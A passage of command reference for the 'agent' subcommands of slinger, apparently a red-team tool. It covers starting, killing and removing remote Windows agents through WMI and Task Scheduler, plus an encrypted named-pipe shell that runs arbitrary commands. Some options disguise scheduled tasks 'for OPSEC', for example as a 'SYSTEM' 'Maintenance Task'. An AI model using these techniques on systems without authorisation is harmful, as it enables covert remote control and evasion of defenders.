- **`format`**: Output format (default: table)
  - Choices: table, list, json
  - Default: `table`
  - Required: No

---

#### `agent rename`

**Description:** Change the ID of a deployed agent in the registry

**Help:**
```
[1;34musage: [0m[1;35mslinger agent rename[0m [[32m-h[0m] [36m--old [33mOLD[0m [36m--new [33mNEW[0m
Change the ID of a deployed agent in the registry
```

**Example Usage:**
```
Example: agent rename --old slinger_abc123 --new my_agent
```

##### Arguments

- **`old`**: Current agent ID
- **`new`**: New agent ID
  - Required: Yes

---

#### `agent check`

**Description:** Verify if the agent process is still running via WMI query

**Help:**
```
[1;34musage: [0m[1;35mslinger agent check[0m [[32m-h[0m] [32magent_id[0m
Verify if the agent process is still running via WMI query
```

**Example Usage:**
```
Example: agent check slinger_abc123
```

##### Arguments

- **`agent_id`**: Agent ID to check
  - Required: Yes

---

#### `agent use`

**Description:** Connect to and interact with a deployed agent via named pipe.

ENCRYPTION & SESSION SECURITY:
  Agents built with --pass use AES-256-GCM encryption with HMAC-SHA256
  authentication. Each session uses unique encryption keys:

  1. Agent generates random 16-byte nonce when you connect
  2. Client proves knowledge of passphrase via HMAC-SHA256 challenge-response
  3. Both derive session key using PBKDF2-HMAC-SHA256(passphrase_hash,
     nonce, 10k iterations)
  4. All commands in the session are encrypted with AES-256-GCM using this key

  FORWARD SECRECY: Each session gets a new random nonce and unique session
  key. Compromising one session does NOT affect past or future sessions.
  To refresh encryption keys, exit and reconnect for a new session.

INTERACTIVE SHELL COMMANDS:
  help        - Show available commands
  exit/quit   - Close session and disconnect from agent
  <command>   - Execute any Windows command on the agent


**Help:**
```
[1;34musage: [0m[1;35mslinger agent use[0m [[32m-h[0m] [[36m--timeout [33mTIMEOUT[0m] [[36m--no-colors[0m] [32magent_id[0m
Connect to and interact with a deployed agent via named pipe.

ENCRYPTION & SESSION SECURITY:
  Agents built with --pass use AES-256-GCM encryption with HMAC-SHA256
  authentication. Each session uses unique encryption keys:

  1. Agent generates random 16-byte nonce when you connect
  2. Client proves knowledge of passphrase via HMAC-SHA256 challenge-response
  3. Both derive session key using PBKDF2-HMAC-SHA256(passphrase_hash,
     nonce, 10k iterations)
  4. All commands in the session are encrypted with AES-256-GCM using this key

  FORWARD SECRECY: Each session gets a new random nonce and unique session
  key. Compromising one session does NOT affect past or future sessions.
  To refresh encryption keys, exit and reconnect for a new session.

INTERACTIVE SHELL COMMANDS:
  help        - Show available commands
  exit/quit   - Close session and disconnect from agent
  <command>   - Execute any Windows command on the agent

```

**Example Usage:**
```
Example: agent use agent_12345 --no-colors
```

##### Arguments

- **`agent_id`**: Agent ID to connect to
- **`timeout`**: Connection timeout in seconds (default: 30)
  - Default: `30`
  - Required: No

---

#### `agent start`

**Description:** Start a stopped or crashed agent using its deployment information

**Help:**
```
[1;34musage: [0m[1;35mslinger agent start[0m [[32m-h[0m] [[36m--method [33m{wmiexec,atexec}[0m] [[36m--sp [33mPATH[0m] [[36m--sn [33mNAME[0m] [[36m--tn [33mNAME[0m] [[36m--ta [33mAUTHOR[0m] [[36m--td [33mDESC[0m] [[36m--tf [33mFOLDER[0m] [[36m--sh [33mSHARE[0m] [[32m-w [33mSECS[0m] [32magent_id[0m
Start a stopped or crashed agent using its deployment information
```

**Example Usage:**
```
Examples:
  agent start slinger_abc123                        # Start using wmiexec (default)
  agent start slinger_abc123 --method atexec        # Start using Task Scheduler
  agent start slinger_abc123 --method atexec --ta "SYSTEM" --td "Maintenance Task"

```

##### Arguments

- **`agent_id`**: Agent ID to start
- **`method`**: Execution method to start agent (default: wmiexec)
  - Choices: wmiexec, atexec
  - Default: `wmiexec`
- **`sp`**: Directory on target to save command output (default: \Users\Public\Downloads\)
  - Default: `\Users\Public\Downloads\`
- **`sn`**: Filename for command output (default: random)
- **`tn`**: Scheduled task name (default: auto-generated)
- **`ta`**: Task author for OPSEC (default: Slinger)
  - Default: `Slinger`
- **`td`**: Task description for OPSEC (default: Slinger Task)
  - Default: `Slinger Task`
- **`tf`**: Task Scheduler folder (default: \Windows)
  - Default: `\Windows`
- **`sh`**: SMB share for output file (default: current share)
- **`wait`**: Seconds to wait for task completion (default: 2)
  - Default: `2`
  - Required: No

---

#### `agent kill`

**Description:** Find and terminate the agent process using taskkill via WMI or Task Scheduler

**Help:**
```
[1;34musage: [0m[1;35mslinger agent kill[0m [[32m-h[0m] [[36m--method [33m{wmiexec,atexec}[0m] [[36m--sp [33mPATH[0m] [[36m--sn [33mNAME[0m] [[36m--tn [33mNAME[0m] [[36m--ta [33mAUTHOR[0m] [[36m--td [33mDESC[0m] [[36m--tf [33mFOLDER[0m] [[36m--sh [33mSHARE[0m] [[32m-w [33mSECS[0m] [32magent_id[0m
Find and terminate the agent process using taskkill via WMI or Task Scheduler
```

**Example Usage:**
```
Examples:
  agent kill slinger_abc123                        # Kill using wmiexec (default)
  agent kill slinger_abc123 --method atexec        # Kill using Task Scheduler
  agent kill slinger_abc123 --method atexec -w 3   # Wait 3 seconds for task completion
  agent kill slinger_abc123 --method atexec --ta "SYSTEM" --td "Maintenance Task"

```

##### Arguments

- **`agent_id`**: Agent ID to kill
- **`method`**: Execution method for taskkill (default: wmiexec)
  - Choices: wmiexec, atexec
  - Default: `wmiexec`
- **`sp`**: Directory on target to save command output (default: \Users\Public\Downloads\)
  - Default: `\Users\Public\Downloads\`
- **`sn`**: Filename for command output (default: random)
- **`tn`**: Scheduled task name (default: auto-generated)
- **`ta`**: Task author for OPSEC (default: Slinger)
  - Default: `Slinger`
- **`td`**: Task description for OPSEC (default: Slinger Task)
  - Default: `Slinger Task`
- **`tf`**: Task Scheduler folder (default: \Windows)
  - Default: `\Windows`
- **`sh`**: SMB share for output file (default: current share)
- **`wait`**: Seconds to wait for task completion (default: 2)
  - Default: `2`
  - Required: No

---

#### `agent rm`

**Description:** Delete the agent executable file and update registry status

**Help:**
```
[1;34musage: [0m[1;35mslinger agent rm[0m [[32m-h[0m] [32magent_id[0m
Delete the agent executable file and update registry status
```

**Example Usage:**
```
Example: agent rm slinger_abc123
```

##### Arguments

- **`agent_id`**: Agent ID to remove
  - Required: Yes

---

#### `agent reset`

**Description:** Kill all running agent processes and delete all agent files

**Help:**
```
[1;34musage: [0m[1;35mslinger agent reset[0m [[32m-h[0m] [[36m--method [33m{wmiexec,atexec}[0m] [[36m--sp [33mPATH[0m] [[36m--sn [33mNAME[0m] [[36m--tn [33mNAME[0m] [[36m--ta [33mAUTHOR[0m] [[36m--td [33mDESC[0m] [[36m--tf [33mFOLDER[0m] [[36m--sh [33mSHARE[0m] [[32m-w [33mSECS[0m]
Kill all running agent processes and delete all agent files
```

**Example Usage:**
```
Examples:
  agent reset                                      # Reset using wmiexec (default)
  agent reset --method atexec                      # Reset using Task Scheduler
  agent reset --method atexec -w 3                 # Wait 3 seconds for task completion

```

##### Arguments

- **`method`**: Execution method for kill operations (default: wmiexec)
  - Choices: wmiexec, atexec
  - Default: `wmiexec`
- **`sp`**: Directory on target to save command output (default: \Users\Public\Downloads\)
  - Default: `\Users\Public\Downloads\`
- **`sn`**: Filename for command output (default: random)
- **`tn`**: Scheduled task name (default: auto-generated)
- **`ta`**: Task author for OPSEC (default: Slinger)
  - Default: `Slinger`
- **`td`**: Task description for OPSEC (default: Slinger Task)
  - Default: `Slinger Task`
- **`tf`**: Task Scheduler folder (default: \Windows)
  - Default: `\Windows`
- **`sh`**: SMB share for output file (default: current share)
- **`wait`**: Seconds to wait for task completion (default: 2)
  - Default: `2`
  - Required: No

---

#### `agent update`

**Description:** Update the agent's file path in the registry

**Help:**
```
[1;34musage: [0m[1;35mslinger agent update[0m [[32m-h[0m] [36m--path [33mPATH[0m [32magent_id[0m
Update the agent's file path in the registry
```

**Example Usage:**
```
Example: agent update slinger_abc123 --path c:\new\path\agent.exe
```

##### Arguments

- **`agent_id`**: Agent ID to update
- **`path`**: New file path for the agent
  - Required: Yes

---
